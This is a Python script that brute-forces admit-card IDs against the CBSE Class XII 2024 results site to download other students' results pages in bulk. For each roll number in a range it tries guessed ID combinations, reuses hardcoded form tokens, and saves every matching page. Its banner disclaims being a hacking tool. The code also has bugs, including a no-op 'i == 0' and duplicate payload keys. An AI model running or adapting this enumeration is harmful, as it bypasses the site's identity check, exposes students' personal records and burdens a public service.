import requests
import re
import glob
from optparse import OptionParser
import os
if not os.path.exists("Results"):
    os.makedirs("Results")

class color:
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    DARKCYAN = "\033[36m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    END = "\033[0m"
    WHITE = "\33[37m"


session = requests.Session()
artwork = (
    color.BOLD
    + color.PURPLE
    + """
______                _ _     _____                    _           
| ___ \\              | | |   /  __ \\                  | |          
| |_/ /___  ___ _   _| | |_  | /  \\/_ __ __ ___      _| | ___ _ __ 
|    // _ \\/ __| | | | | __| | |   | '__/ _` \\ \\ /\\ / / |/ _ \\ '__|
| |\\ \\  __/\\__ \\ |_| | | |_  | \\__/\\ | | (_| |\\ V  V /| |  __/ |   
\\_| \\_\\___||___/\\__,_|_|\\__|  \\____/_|  \\__,_| \\_/\\_/ |_|\\___|_|  
{0} Disclaimer - Made by students for fun, not to hurt anyone's privacy.
{0} This is not a hacking tool.
{0} You might have to wait for results, the program tells you when it finds one.
""".format(
        color.BLUE
    )
)
print(artwork)
parser = OptionParser()

parser.add_option("-s", "--start", dest="start", help="the starting roll no.")
parser.add_option("-e", "--end", dest="end", help="the ending roll no.")
parser.add_option("-c", "--code", dest="sklcode", help="School Code")
parser.add_option("-n", "--center", dest="centNo", help="Center code")
(c_options, args) = parser.parse_args()
start = c_options.start
end = c_options.end
sklcode = c_options.sklcode
centNo = c_options.centNo
headers = {
    "Host": "testservices.nic.in",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://testservices.nic.in/",
    "Content-Length": "0",
    "Origin": "https://testservices.nic.in",
    "DNT": "1",
}
aph = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
pv1 = "AAAAAAW2KHzrqU6ovtFyNJfql3blC6L0ci1MGbdufq2S-nfJrzWEvZdZPO_fqcL-1UP1EqzQgQhMlng5yzmD1s0e7Ph5x4oHzIBBwp27HTNVXzafIOKgpUdMzXD2zeO4ywfgDqw%3D"
pv2 = "f914448d28d08fb83ead1c1ced699372b7de6e51"
pv3 = "AAAAAAWOyNUww0f-KakO_D4QDHBUxRfRXmfJXY1fn-E3GwOJz5qWbdvtHCjR1-mWMG4nr_ETJs3rHSuMrJbTuZbIZAvYvzlJsMVvNytSnM_HG8m2mHzaZMgOw26b-KF-KHymO-0%3D"
pv4 = "218520f49f375ef87e6d64848742f8d82195e9f7"

fn = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

i = 0


def wizard():
    global start, end, sklcode, centNo
    try:
        request = requests.get(
            "https://testservices.nic.in/cbseresults/class_xii_a_2024/ClassTwelfth_c_2024.asp"
        )
        if request.status_code == 200:
            print(f"{color.GREEN}[OK] {color.WHITE}")
    except requests.ConnectTimeout:
        print(
            color.RED
            + "[X]"
            + color.YELLOW
            + "\n[!] "
            + color.WHITE
            + "Connection timed out"
        )
        exit(1)
    except KeyboardInterrupt:
        print(color.RED + "[!] " + color.WHITE + "Exited upon user request...")
        exit()
    except:
        print(color.RED + "[X]" + color.WHITE)
        print(
            color.RED
            + "[!]"
            + color.WHITE
            + " Website could not be located make sure to use http / https"
        )
        exit()

    start = input(color.GREEN + "[~] " + color.WHITE + "Start value: ")
    end = input(color.GREEN + "[~] " + color.WHITE + "Stop value: ")
    sklcode = input(
        color.GREEN + "[~] " + color.WHITE + "School code: "
    )
    centNo = input(
        color.GREEN + "[~] " + color.WHITE + "Center code: "
    )


def req(rno):
    global pv1, pv2, pv3, pv4, fn, i

    if i > 25:
        i == 0
    fc = 0

    for mn in aph:
        payload = {
            "regno": rno,
            "sch": sklcode,
            "admid": f"{fn[i]}{mn}{str(rno)[5:7]}{sklcode[0:2]}{centNo[2:4]}",
            "B2": "Submit",
            "as_sfid": pv1,
            "as_fid": pv2,
            "as_sfid": pv3,
            "as_fid": pv4,
        }
        q = session.post(
            "https://testservices.nic.in/cbseresults/class_xii_a_2024/ClassTwelfth_c_2024.asp",
            data=payload,
            headers=headers,
        )

        m = re.search("Result Not Found", q.text)
        if m == None:
            f = open(f"Results/{rno}.htm", "w")
            f.write(q.text)
            f.close()
            print(f"{color.GREEN}Found: {color.WHITE}[{rno}]")
        else:
            fc += 1
        if i > 25:
            i == 0
        if fc == 26:
            i += 1
            req(rno)


if c_options.start == None:
    if c_options.end == None:
        if c_options.sklcode == None:
            if c_options.centNo == None:
                try:
                    wizard()
                except KeyboardInterrupt:
                    print(f"{color.RED}\n[#] {color.WHITE}Exited upon user request...")
                    exit()

for rno in range(int(start), int(end)):
    if f"Results/{rno}.htm" in [f for f in glob.glob("Results/*.htm")]:
        print(f"{rno} already in list")
        continue
    req(rno)
